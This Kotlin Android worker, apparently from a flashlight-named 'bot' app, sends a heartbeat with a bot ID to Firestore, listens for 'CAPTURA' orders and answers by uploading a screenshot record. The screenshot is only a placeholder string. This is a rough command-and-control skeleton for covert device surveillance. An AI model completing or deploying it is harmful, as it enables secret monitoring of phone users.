package com.linternbot

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*

class UploadWorker(appContext: Context, workerParams: WorkerParameters): Worker(appContext, workerParams) {
    override fun doWork(): Result {

        val c = Calendar.getInstance()
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        val strDate: String = sdf.format(c.time)
        val idBot =  inputData.getString("IDbot")
        // Do the work here--in this case, upload the images.
        val db = Firebase.firestore
        val user = hashMapOf(
            "Bot ID" to idBot,
            "Hora" to strDate
        )

        val captura = hashMapOf(
            "Bot ID" to idBot,
            "Hora" to strDate,
            "Captura" to "Esto sería una captura de pantalla"
        )

        // Add a new document with a generated ID
        db.collection("ImAlive").document(strDate).set(user)

        db.collection("ordenes")
            .whereEqualTo("Primitiva", "CAPTURA")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("capturas").document(idBot.toString()).set(captura)
                    }
                }

            }

        Log.d("TAG2","Se ejecuta la tarea programada")

        // Indicate whether the work finished successfully with the Result
        return Result.success()
    }
}
